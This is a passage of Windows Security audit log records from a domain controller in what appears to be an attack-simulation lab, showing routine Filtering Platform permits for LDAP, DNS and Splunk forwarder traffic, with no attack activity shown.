			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege
			SeEnableDelegationPrivilege
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382631
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		852
	Application Name:	\device\harddiskvolume1\windows\system32\lsass.exe

Network Information:
	Direction:		Inbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55167
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382630
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1540
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55167
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:52 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382629
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1540
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		55167
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:53 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382659
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		57818
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:55:53 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382658
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		57818
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:53 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382657
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59738
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382662
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59394
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382661
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55170
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:56 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382660
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55170
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
